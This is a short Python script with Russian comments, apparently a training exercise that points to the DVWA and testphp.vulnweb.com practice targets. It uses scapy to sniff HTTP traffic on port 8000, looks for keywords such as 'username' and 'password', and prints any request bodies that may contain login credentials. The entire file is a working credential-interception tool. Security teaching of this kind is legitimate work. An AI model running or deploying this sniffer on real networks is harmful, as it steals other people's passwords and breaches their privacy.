# Импортируем функцию sniff для перехвата сетевых пакетов
# Raw — слой с "сырыми" данными пакета (payload)
from scapy.all import sniff, Raw
# Позволяет распознавать HTTP-запросы внутри пакетов
from scapy.layers.http import HTTPRequest
# DVWA — специально уязвимое приложение для изучения безопасности
# https://github.com/digininja/DVWA/blob/master/README.ru.md
# Или на тестовом сайте
# http://testphp.vulnweb.com/login.php
# Список ключевых слов, по которым мы будем искать логины и пароли
# Они часто встречаются в HTTP POST запросах
keywords = [
    "username",
    "user",
    "login",
    "password",
    "pass",
    "email"
]
# Функция извлекает полный URL из HTTP запроса
def get_url(packet):
    # Host — домен сайта
    host = packet[HTTPRequest].Host.decode()
    # Path — путь к странице (например /login.php)
    path = packet[HTTPRequest].Path.decode()
    # Формируем полный URL
    return "http://" + host + path
# Функция ищет возможные логины и пароли в теле HTTP запроса
def get_credentials(packet):
    # Проверяем есть ли в пакете Raw слой
    # Raw содержит "сырые" данные (payload), например тело POST запроса
    if packet.haslayer(Raw):
        # Декодируем байты в строку
        # errors="ignore" игнорирует ошибки декодирования
        load = packet[Raw].load.decode(errors="ignore")
        # Проверяем наличие ключевых слов
        for keyword in keywords:
            # load.lower() — приводим строку к нижнему регистру
            if keyword in load.lower():
                # Если найдено ключевое слово — возвращаем весь payload
                return load
# Функция вызывается для каждого перехваченного пакета
def process_packet(packet):
    # Проверяем является ли пакет HTTP запросом
    if packet.haslayer(HTTPRequest):
        # Получаем URL запроса
        url = get_url(packet)
        print("\n[HTTP REQUEST]")
        print("URL:", url)
        # Пытаемся извлечь возможные креды
        credentials = get_credentials(packet)
        # Если что-то найдено
        if credentials:
            print("\n[!!! POSSIBLE CREDENTIALS FOUND !!!]")
            print(credentials)
# Сообщение о запуске сниффера
print("HTTP credential sniffer started...\n")
# Запускаем перехват пакетов
sniff(
    # BPF фильтр
    # tcp port 8000 — перехватываем HTTP трафик на порту 8000
    # (часто используется локальными dev серверами и тестовыми сайтами)
    filter="tcp port 8000",
    # prn — функция, которая будет вызываться для каждого пакета
    prn=process_packet,
    # store=False — не сохранять пакеты в память
    # это предотвращает переполнение памяти
    store=False
)